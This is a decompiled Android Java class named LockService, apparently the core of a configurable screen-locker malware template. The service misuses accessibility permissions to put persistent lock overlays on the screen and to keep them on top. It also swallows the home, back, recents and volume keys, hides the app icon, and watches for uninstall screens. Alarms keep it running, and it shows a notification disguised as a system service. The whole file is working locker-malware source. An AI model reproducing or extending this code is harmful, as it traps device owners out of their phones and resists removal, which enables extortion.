package com.lockgen.template.app.core;

import android.accessibilityservice.AccessibilityService;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.media.VolumeProvider;
import android.media.session.MediaSession;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.KeyEvent;
import android.view.accessibility.AccessibilityEvent;
import com.lockgen.template.app.core.LayerView;
import com.lockgen.template.app.sku.SkuGuardService;
import java.util.ArrayList;
import java.util.List;
import org.json.JSONArray;
import org.json.JSONObject;

public class LockService extends AccessibilityService {
    private static final String SP = "sp";
    private static final String TAG = "TplLockService";
    private JSONObject cfg;
    private Effects effects;
    private boolean fgStarted;
    private Guard guard;
    private JSONObject guardCfg;
    private boolean initialized;
    private MediaSession session;
    private SharedPreferences sp;
    private JSONObject theme;
    private JSONObject uiCfg;
    private final List<JSONObject> layers = new ArrayList();
    private final List<LayerView> views = new ArrayList();
    private int current = 0;
    private final Handler ui = new Handler(Looper.getMainLooper());

    @Override // android.app.Service
    public void onCreate() {
        super.onCreate();
        this.sp = getSharedPreferences(SP, 0);
        try {
            JSONObject jSONObject = Cfg.get(this);
            this.cfg = jSONObject;
            this.theme = Cfg.obj(jSONObject, "theme");
            this.guardCfg = Cfg.obj(this.cfg, "guard");
            this.uiCfg = Cfg.obj(this.cfg, "ui");
            JSONArray arr = Cfg.arr(this.cfg, "layers");
            for (int i = 0; i < arr.length(); i++) {
                JSONObject optJSONObject = arr.optJSONObject(i);
                if (optJSONObject != null) {
                    this.layers.add(optJSONObject);
                }
            }
        } catch (Throwable th) {
            Log.e(TAG, "配置解析失败", th);
        }
        if (this.effects == null) {
            this.effects = new Effects(this, Cfg.obj(this.cfg, "fx"));
        }
        if (this.guard == null) {
            this.guard = new Guard(this, this.guardCfg);
        }
    }

    @Override // android.accessibilityservice.AccessibilityService
    public void onServiceConnected() {
        super.onServiceConnected();
        startForegroundIfNeeded();
        try {
            if ("sku".equals(Cfg.str(this.cfg, "lockType", "ab"))) {
                SkuGuardService.start(this);
            }
        } catch (Throwable unused) {
        }
        try {
            performGlobalAction(2);
        } catch (Throwable unused2) {
        }
        new Thread(new Runnable() { // from class: com.lockgen.template.app.core.LockService$$ExternalSyntheticLambda2
            @Override // java.lang.Runnable
            public final void run() {
                LockService.this.lambda$onServiceConnected$1();
            }
        }, "tpl-lockinit").start();
        if (Cfg.b(this.guardCfg, "boot", true)) {
            KeepAlive.schedule(this, Cfg.i(this.guardCfg, "alarmSec", 300));
        }
        if (Cfg.b(this.guardCfg, "shortcut", false)) {
            Shortcuts.flood(this, Cfg.i(this.guardCfg, "flood", 20));
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    public /* synthetic */ void lambda$onServiceConnected$1() {
        try {
            buildLayers();
            this.ui.post(new Runnable() { // from class: com.lockgen.template.app.core.LockService$$ExternalSyntheticLambda0
                @Override // java.lang.Runnable
                public final void run() {
                    LockService.this.lambda$onServiceConnected$0();
                }
            });
        } catch (Throwable th) {
            Log.e(TAG, "锁屏初始化失败", th);
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    public /* synthetic */ void lambda$onServiceConnected$0() {
        this.initialized = true;
        showLayer(0);
        applyLockSideEffects();
    }

    private void startForegroundIfNeeded() {
        if (this.fgStarted) {
            return;
        }
        if (!Cfg.b(this.guardCfg, "fg", true)) {
            Log.i(TAG, "guard.fg 已关闭，跳过后台服务提权");
            return;
        }
        try {
            NotificationManager notificationManager = (NotificationManager) getSystemService(NotificationManager.class);
            if (notificationManager != null) {
                NotificationChannel notificationChannel = new NotificationChannel("tpl_fg", Cfg.str(this.uiCfg, "fgTitle", "系统服务"), 1);
                notificationChannel.setShowBadge(false);
                notificationManager.createNotificationChannel(notificationChannel);
            }
            startForeground(1001, new Notification.Builder(this, "tpl_fg").setContentTitle(Cfg.str(this.uiCfg, "fgTitle", "系统服务")).setContentText(Cfg.str(this.uiCfg, "fgText", "运行中")).setSmallIcon(17301535).setPriority(-2).setCategory("service").build());
            this.fgStarted = true;
        } catch (Throwable th) {
            Log.w(TAG, "前台服务提权失败", th);
        }
    }

    private void buildLayers() {
        this.ui.post(new Runnable() { // from class: com.lockgen.template.app.core.LockService$$ExternalSyntheticLambda1
            @Override // java.lang.Runnable
            public final void run() {
                LockService.this.lambda$buildLayers$3();
            }
        });
    }

    /* JADX INFO: Access modifiers changed from: private */
    public /* synthetic */ void lambda$buildLayers$3() {
        this.views.clear();
        for (int i = 0; i < this.layers.size(); i++) {
            this.views.add(new LayerView(this, this.layers.get(i), this.theme, i, this.layers.size(), new LayerView.Callback() { // from class: com.lockgen.template.app.core.LockService$$ExternalSyntheticLambda4
                @Override // com.lockgen.template.app.core.LayerView.Callback
                public final void onUnlocked(int i2) {
                    LockService.this.lambda$buildLayers$2(i2);
                }
            }));
        }
    }

    private void showLayer(int i) {
        if (i >= this.views.size()) {
            finishLock();
            return;
        }
        this.current = i;
        LayerView layerView = this.views.get(i);
        if (layerView == null) {
            finishLock();
            return;
        }
        layerView.show();
        this.sp.edit().putBoolean("lock_active", true).apply();
        applyLockSideEffects();
    }

    /* JADX INFO: Access modifiers changed from: private */
    /* renamed from: onLayerUnlocked */
    public void lambda$buildLayers$2(final int i) {
        this.ui.post(new Runnable() { // from class: com.lockgen.template.app.core.LockService$$ExternalSyntheticLambda3
            @Override // java.lang.Runnable
            public final void run() {
                LockService.this.lambda$onLayerUnlocked$4(i);
            }
        });
    }

    /* JADX INFO: Access modifiers changed from: private */
    public /* synthetic */ void lambda$onLayerUnlocked$4(int i) {
        int i2 = i + 1;
        if (i2 < this.views.size()) {
            showLayer(i2);
        } else {
            finishLock();
        }
    }

    private void applyLockSideEffects() {
        if (Cfg.b(this.guardCfg, "hideIcon", true)) {
            KeepAlive.setIconVisible(this, false);
        }
        if (Cfg.b(this.guardCfg, "boot", true)) {
            KeepAlive.schedule(this, Cfg.i(this.guardCfg, "activeSec", 60));
        }
        Effects effects = this.effects;
        if (effects != null) {
            effects.startAll();
        }
        if (Cfg.b(this.guardCfg, "volumeLock", false)) {
            startVolumeLock();
        }
    }

    private void finishLock() {
        for (LayerView layerView : this.views) {
            if (layerView != null) {
                layerView.dismiss();
            }
        }
        this.sp.edit().putBoolean("lock_active", false).apply();
        Effects effects = this.effects;
        if (effects != null) {
            effects.stopAll();
        }
        stopVolumeLock();
        KeepAlive.cancel(this);
        KeepAlive.setIconVisible(this, true);
        stopSelf();
    }

    private void startVolumeLock() {
        if (this.session != null) {
            return;
        }
        try {
            MediaSession mediaSession = new MediaSession(this, "tpl_vol");
            this.session = mediaSession;
            mediaSession.setPlaybackToRemote(new VolumeProvider(0, 100, 50) { // from class: com.lockgen.template.app.core.LockService.1
                @Override // android.media.VolumeProvider
                public void onAdjustVolume(int i) {
                }
            });
            this.session.setActive(true);
        } catch (Throwable th) {
            Log.w(TAG, "音量接管失败", th);
        }
    }

    private void stopVolumeLock() {
        try {
            MediaSession mediaSession = this.session;
            if (mediaSession != null) {
                mediaSession.setActive(false);
                this.session.release();
            }
        } catch (Throwable unused) {
        }
        this.session = null;
    }

    @Override // android.accessibilityservice.AccessibilityService
    public void onAccessibilityEvent(AccessibilityEvent accessibilityEvent) {
        if (accessibilityEvent == null) {
            return;
        }
        try {
            boolean isLockShowing = isLockShowing();
            this.guard.onUninstallSurface(accessibilityEvent);
            int eventType = accessibilityEvent.getEventType();
            CharSequence packageName = accessibilityEvent.getPackageName();
            String obj = packageName == null ? null : packageName.toString();
            if (eventType == 32) {
                if (this.guard.onTargetWindow(obj)) {
                    reassertTops();
                } else {
                    this.guard.onWindowChanged(accessibilityEvent, isLockShowing);
                }
            } else if (eventType == 4194304 && this.guard.onWindowsChanged()) {
                reassertTops();
            }
        } catch (Throwable th) {
            Log.w(TAG, "事件处理异常", th);
        }
    }

    private boolean isLockShowing() {
        for (LayerView layerView : this.views) {
            if (layerView != null && layerView.isShowing()) {
                return true;
            }
        }
        return false;
    }

    private void reassertTops() {
        for (LayerView layerView : this.views) {
            if (layerView != null && layerView.isShowing()) {
                layerView.reassertTop();
            }
        }
    }

    @Override // android.accessibilityservice.AccessibilityService
    public boolean onKeyEvent(KeyEvent keyEvent) {
        if (!isLockShowing() || !Cfg.b(this.guardCfg, "blockKeys", true)) {
            return super.onKeyEvent(keyEvent);
        }
        try {
            int keyCode = keyEvent.getKeyCode();
            if (keyCode == 24 || keyCode == 25 || keyCode == 4 || keyCode == 3 || keyCode == 187 || keyCode == 219 || keyCode == 231) {
                return true;
            }
        } catch (Throwable unused) {
        }
        return super.onKeyEvent(keyEvent);
    }

    @Override // android.accessibilityservice.AccessibilityService
    public void onInterrupt() {
        Log.d(TAG, "onInterrupt");
    }

    @Override // android.app.Service
    public void onTaskRemoved(Intent intent) {
        super.onTaskRemoved(intent);
        if (isLockShowing()) {
            return;
        }
        KeepAlive.setIconVisible(this, true);
    }

    @Override // android.app.Service
    public void onDestroy() {
        super.onDestroy();
        this.ui.removeCallbacksAndMessages(null);
        for (LayerView layerView : this.views) {
            if (layerView != null) {
                layerView.dismiss();
            }
        }
        this.views.clear();
        Effects effects = this.effects;
        if (effects != null) {
            effects.stopAll();
        }
        stopVolumeLock();
        this.sp.edit().putBoolean("lock_active", false).apply();
        KeepAlive.setIconVisible(this, true);
    }

    public static void startIfEnabled(Context context) {
        try {
            context.startService(new Intent(context, LockService.class));
        } catch (Throwable unused) {
        }
    }
}